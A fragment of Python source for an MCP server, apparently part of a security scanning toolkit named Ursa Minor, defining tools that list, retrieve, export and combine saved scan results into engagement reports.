    if not results:
        filters = []
        if tool_filter:
            filters.append(f"tool={tool_filter!r}")
        if target_filter:
            filters.append(f"target={target_filter!r}")
        if hours is not None:
            filters.append(f"last {hours}h")
        suffix = f" matching {', '.join(filters)}" if filters else ""
        return f"No saved scan results found{suffix}.\n\nRun any Ursa Minor scan to start building results."

    lines = [
        f"Saved Scan Results ({len(results)} of up to {limit})",
        "=" * 55,
        "",
    ]
    for r in results:
        meta = r.get("metadata", {})
        target = (
            meta.get("target")
            or meta.get("target_range")
            or meta.get("domain")
            or meta.get("url")
            or ""
        )
        target_str = f"  target={target}" if target else ""
        lines.append(f"  [{r['tool']}]  {r['id']}{target_str}")
        lines.append(f"    {r['timestamp']}")
        lines.append("")

    lines.append(f"Use ursa_results_get(result_id) to see full output.")
    lines.append(f"Use ursa_results_export(result_id) to export to file.")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_results_get(result_id: str) -> str:
    """Get the full stored output of a saved scan result.

    Args:
        result_id: The result ID from ursa_results_list (e.g. "scan_ports_20240315_143022").
    """
    from ursa_minor.results import get_result

    record = get_result(result_id)
    if record is None:
        return f"Result not found: {result_id}\n\nUse ursa_results_list() to see available IDs."

    tool = record.get("tool", "unknown")
    ts = record.get("timestamp_str", "")
    meta = record.get("metadata", {})
    result_text = record.get("result", "")
    structured = record.get("structured_data")

    lines = [
        f"Result: {result_id}",
        f"Tool:   {tool}",
        f"Time:   {ts}",
    ]
    if meta:
        lines.append("Meta:   " + "  ".join(f"{k}={v}" for k, v in meta.items()))
    lines += ["", "─" * 55, "", result_text]

    if structured:
        lines += ["", "─" * 55, f"Structured data: {len(structured) if isinstance(structured, list) else 'dict'} items"]

    return "\n".join(lines)


@mcp_server.tool()
def ursa_results_export(
    result_id: str,
    format: str = "json",
    output_path: str | None = None,
) -> str:
    """Export a single saved scan result to JSON, CSV, or HTML.

    Args:
        result_id: Result ID from ursa_results_list.
        format: Output format — "json", "csv", or "html" (default: json).
        output_path: Write to this file path. If omitted, returns content inline.
    """
    from ursa_minor.results import export_json, export_csv, export_html, get_result

    record = get_result(result_id)
    if record is None:
        return f"Result not found: {result_id}"

    fmt = format.lower()
    if fmt == "json":
        content = export_json(result_id)
    elif fmt == "csv":
        content = export_csv(result_id)
    elif fmt == "html":
        content = export_html(result_id)
    else:
        return f"Unknown format: {format!r}. Choose json, csv, or html."

    if output_path:
        out = Path(output_path).expanduser()
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(content, encoding="utf-8")
        return f"Exported {result_id} ({fmt}) → {out}\n({len(content):,} bytes)"

    # Inline return — truncate very large results
    if len(content) > 8000:
        return content[:8000] + f"\n\n... [{len(content) - 8000:,} more bytes — use output_path to save to file]"
    return content


@mcp_server.tool()
def ursa_results_report(
    result_ids: list[str] | None = None,
    tool_filter: str | None = None,
    title: str = "Engagement Report",
    format: str = "html",
    output_path: str | None = None,
) -> str:
    """Generate a combined engagement report from multiple scan results.

    Bundles results from multiple Ursa Minor scans into a single report.
    HTML is best for sharing; JSON for programmatic use; CSV for spreadsheets.

    Args:
        result_ids: Specific result IDs to include. Uses all if omitted.
        tool_filter: Filter by tool name when result_ids is None.
        title: Report title (default: "Engagement Report").
        format: "html", "json", or "csv" (default: html).
        output_path: Write report to this file. Required for HTML (large output).
    """
    from ursa_minor.results import export_engagement_report, list_results

    # Default output path for HTML reports
    if output_path is None and format.lower() == "html":
        import time
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = str(Path.home() / ".ursa" / "reports" / f"engagement_{ts}.html")

    content = export_engagement_report(
        result_ids=result_ids,
        tool_filter=tool_filter,
        title=title,
        format=format.lower(),
    )

    if output_path:
        out = Path(output_path).expanduser()
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(content, encoding="utf-8")
        count = len(result_ids) if result_ids else len(list_results(tool_filter=tool_filter, limit=200))
        return (
            f"Engagement report generated\n"
            f"  Title:   {title}\n"
            f"  Format:  {format}\n"
            f"  Results: {count}\n"
            f"  Saved:   {out}\n"
            f"  Size:    {len(content):,} bytes"
        )

    # Inline return — truncate if huge
    if len(content) > 8000:
        return content[:8000] + f"\n\n... [{len(content) - 8000:,} more bytes — use output_path to save to file]"
    return content


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ursa Major MCP server")
    parser.add_argument(
        "--transport",
        choices=("stdio", "streamable-http"),
        default=os.environ.get("URSA_MCP_TRANSPORT", "stdio"),
        help="MCP transport to use",
    )
    parser.add_argument(
        "--host",
        default=os.environ.get("URSA_MCP_HOST", "127.0.0.1"),
        help="Host to bind for streamable HTTP transport",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=int(os.environ.get("URSA_MCP_PORT", "8765")),
        help="Port to bind for streamable HTTP transport",
    )
    parser.add_argument(
        "--streamable-http-path",
        default=os.environ.get("URSA_MCP_STREAMABLE_HTTP_PATH", "/mcp"),
        help="Path to expose for streamable HTTP transport",
    )
    args = parser.parse_args()

    if args.transport == "streamable-http":
        # FastMCP reads these values when building the HTTP app.
        mcp_server.settings.host = args.host
        mcp_server.settings.port = args.port
        mcp_server.settings.streamable_http_path = args.streamable_http_path
        print("  URSA MAJOR — MCP (streamable HTTP)")
        print(f"  http://{args.host}:{args.port}{args.streamable_http_path}")
        print()

    mcp_server.run(transport=args.transport)
